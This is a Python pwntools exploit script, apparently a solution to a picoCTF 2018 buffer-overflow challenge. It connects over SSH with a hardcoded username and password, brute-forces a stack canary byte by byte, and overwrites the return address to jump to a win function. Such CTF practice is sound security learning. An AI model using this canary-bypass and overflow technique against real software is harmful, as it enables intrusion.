#coding=utf-8
from pwn import *
import sys

vuln = 0x80488f9
second_read = 0x8048853
stack_read = 0xffffd508
ret =  0xffffd53c
win = 0x80486eb 
canary = ''

s = ssh(host = '2018shell3.picoctf.com', user = 'Zeze', password = 'casper1014')
s.set_working_directory('/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce')

def get_canary():
  global canary
  for i in range(4):
    print '{0} byte'.format(i+1)
    for j in range(256):
      p = s.process('./vuln')
      #p = process('./vuln')

      p.recvuntil('> ')
      p.sendline(str(32 + i + 1))
      p.recvuntil('> ')
      p.sendline('a'*32 + canary + chr(j))
      res = p.recvall(1)
      
      if 'Stack Smashing' not in res:
        print j
        canary += chr(j)
        break

get_canary()
print canary
p = s.process('./vuln')
#p = process('./vuln')
p.recvuntil('> ')
p.sendline('100')
p.recvuntil('> ')
p.sendline('a' * 32 + canary + 'a' * (ret - stack_read - 36) + p32(win))
res = p.recvall(1)

print res

